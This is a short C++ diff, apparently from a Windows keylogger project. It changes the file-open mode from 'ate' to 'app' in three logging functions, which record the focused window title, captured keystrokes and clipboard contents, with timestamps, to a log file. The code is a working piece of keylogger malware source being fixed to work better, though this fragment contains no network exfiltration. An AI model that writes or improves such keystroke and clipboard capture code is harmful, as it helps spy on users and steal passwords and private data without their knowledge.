@@ -16,7 +16,7 @@ std::string getTime(const char * format)
 void logWindowChange()
 {
     std::ofstream myfile;
-    myfile.open(winkey_g.pathFile, std::ios::in | std::ios::out | std::ios::ate);
+    myfile.open(winkey_g.pathFile, std::ios::in | std::ios::out | std::ios::app);
     if (!winkey_g.nl)
         myfile << std::endl;
     myfile << getTime("[%d.%m.%Y %H:%M:%S]") << " - '" << winkey_g.hwndFocusedWindow << "'" << std::endl;
@@ -28,7 +28,7 @@ void logInput(char* buffer)
 {
     std::ofstream myfile;
 
-    myfile.open(winkey_g.pathFile, std::ios::in | std::ios::out | std::ios::ate);
+    myfile.open(winkey_g.pathFile, std::ios::in | std::ios::out | std::ios::app);
     if (!myfile.is_open())
         std::cout << "failed to open file\n";
     myfile << buffer;
@@ -38,7 +38,7 @@ void logInput(char* buffer)
 void logClipboard(std::string buffer)
 {
     std::ofstream myfile;
-    myfile.open(winkey_g.pathFile, std::ios::in | std::ios::out | std::ios::ate);
+    myfile.open(winkey_g.pathFile, std::ios::in | std::ios::out | std::ios::app);
     if (!winkey_g.nl)
         myfile << std::endl;
     myfile << getTime("[%d.%m.%Y %H:%M:%S]") << " - ClipBoard : '" << buffer << "'" << std::endl;
